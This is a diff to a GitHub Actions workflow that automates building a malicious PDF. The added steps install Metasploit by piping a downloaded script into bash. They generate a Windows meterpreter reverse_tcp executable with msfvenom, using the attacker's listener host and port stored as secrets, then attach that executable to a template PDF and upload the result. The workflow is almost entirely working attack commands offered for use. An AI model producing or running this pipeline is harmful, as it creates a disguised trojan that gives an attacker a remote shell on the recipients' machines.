@@ -1,7 +1,6 @@
 name: Embed Windows Payload in PDF
 
-on:
-  workflow_dispatch:
+on: [workflow_dispatch]
 
 jobs:
   build:
@@ -10,26 +9,21 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-   #   - name: Optional - Clone PDF template from external repo
-        # Uncomment and edit if you want to use a template from another repo
-        # uses: actions/checkout@v4
-        # with:
-        #   repository: anotherowner/templaterepo
-        #   path: pdf_template_repo
+      - name: Install mupdf-tools
+        run: sudo apt-get update && sudo apt-get install -y mupdf-tools
 
-      - name: Install dependencies
+      - name: Install Metasploit Framework
         run: |
           sudo apt-get update
-          sudo apt-get install -y metasploit-framework mupdf-tools
+          sudo apt-get install -y curl
+          curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/msfupdate | bash
 
-      - name: Run payload embedding script
+      - name: Generate Windows payload with msfvenom
         run: |
-          chmod +x generate_and_embed_windows_payload.sh
-          ./generate_and_embed_windows_payload.sh \
-            "${{ secrets.LHOST }}" \
-            "${{ secrets.LPORT }}" \
-            "template.pdf" \      # <-- Adjust to your template path
-            "payload.pdf"
+          msfvenom -p windows/meterpreter/reverse_tcp LHOST="${{ secrets.LHOST }}" LPORT="${{ secrets.LPORT }}" -f exe -o shell.exe
+
+      - name: Embed payload in PDF
+        run: mutool attach template.pdf payload.pdf shell.exe
 
       - name: Upload PDF artifact
         uses: actions/upload-artifact@v4
